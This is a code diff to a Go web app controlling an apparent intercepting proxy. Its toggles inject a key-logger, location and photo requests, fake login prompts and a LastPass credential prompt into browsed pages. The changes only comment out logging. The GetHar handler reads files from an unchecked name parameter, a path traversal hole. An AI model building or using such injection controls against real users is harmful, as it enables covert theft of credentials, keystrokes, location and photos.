@@ -29,7 +29,7 @@ func (c App) GetField() revel.Result {
 	switch field {
 		case 0:
 			//its the har state
-			log.Println("hars! ", globalStoreHAR)
+			// log.Println("hars! ", globalStoreHAR)
 			return c.RenderJson(globalStoreHAR)
 		case 1: return c.RenderJson(globalRedirects)
 		case 2: return c.RenderJson(globalBlocks)
@@ -43,11 +43,11 @@ func (c App) GetField() revel.Result {
 
 func InitiateProxy() {
 	//set the location for files
-    log.Println("loading storage location")
-    fileLocation, proxyAddress := setFileStorageLocation()
+    // log.Println("loading storage location")
+    _, proxyAddress := setFileStorageLocation()
     //setting the logger to output to a file
 
-    log.Println("location: ", fileLocation, " address: ", proxyAddress)
+    // log.Println("location: ", fileLocation, " address: ", proxyAddress)
     //reset all parameters for the proxy
 	globalStoreHAR = true			
 	globalProxyStandard = false
@@ -210,39 +210,39 @@ func (c App) TriggerInjection() revel.Result {
 			log.Println(" --- OPTION: Turning on key-logger")
 		} else {
 			globalInjectKeyLogger = false
-			log.Println(" --- OPTION: Turning off key-logger")
+			// log.Println(" --- OPTION: Turning off key-logger")
 		}
 	} else if trigger == "getlocation" {
 		if globalInjectGetLocation == false {
 			globalInjectGetLocation = true
-			log.Println(" --- OPTION: Turning on Location Request")
+			// log.Println(" --- OPTION: Turning on Location Request")
 		} else {
 			globalInjectGetLocation = false
-			log.Println(" --- OPTION: Turning on Location Request")
+			// log.Println(" --- OPTION: Turning on Location Request")
 		}
 	} else if trigger == "takephoto" {
 		if globalInjectGetPhoto == false {
 			globalInjectGetPhoto = true
-			log.Println(" --- OPTION: Turning on Photo Request")
+			// log.Println(" --- OPTION: Turning on Photo Request")
 		} else {
 			globalInjectGetPhoto = false
-			log.Println(" --- OPTION: Turning on Photo Request")
+			// log.Println(" --- OPTION: Turning on Photo Request")
 		}
 	} else if trigger == "requestlogin" {
 		if globalInjectGetLogin == false {
 			globalInjectGetLogin = true
-			log.Println(" --- OPTION: Turning on Login Request")
+			// log.Println(" --- OPTION: Turning on Login Request")
 		} else {
 			globalInjectGetLogin = false
-			log.Println(" --- OPTION: Turning on Login Request")
+			// log.Println(" --- OPTION: Turning on Login Request")
 		}
 	} else if trigger == "requestlasspass" {
 		if globalInjectLastpass == false {
 			globalInjectLastpass = true
-			log.Println(" --- OPTION: Turning on Login Request")
+			// log.Println(" --- OPTION: Turning on Login Request")
 		} else {
 			globalInjectLastpass = false
-			log.Println(" --- OPTION: Turning on Login Request")
+			// log.Println(" --- OPTION: Turning on Login Request")
 		}
 	} 
 	KillProxy()
@@ -346,13 +346,13 @@ func (c App) CatchKeyLog() revel.Result {
 
 func (c App) GetHars() revel.Result {
 	var fileNames []string
-	log.Println("reading hars from: ", harLocation+"/hars/")
+	// log.Println("reading hars from: ", harLocation+"/hars/")
 	files, err := ioutil.ReadDir(harLocation+"/hars/")
 	if err != nil {
-		log.Println("error: ", err)
+		// log.Println("error: ", err)
 	}
 	for _, f := range files {
-		log.Println(f.Name())
+		// log.Println(f.Name())
         fileNames = append(fileNames, f.Name())
     }
 	return c.RenderJson(fileNames)
@@ -362,7 +362,7 @@ func (c App) GetHar() revel.Result {
 	var harName string
 	c.Params.Bind(&harName, "harname")
     data, err := ioutil.ReadFile(harLocation+"/hars/"+harName)
-    log.Println("location: ", harLocation+"/hars/"+harName)
+    // log.Println("location: ", harLocation+"/hars/"+harName)
     if err != nil {
     	return c.RenderJson("The file may not exist...")
     }
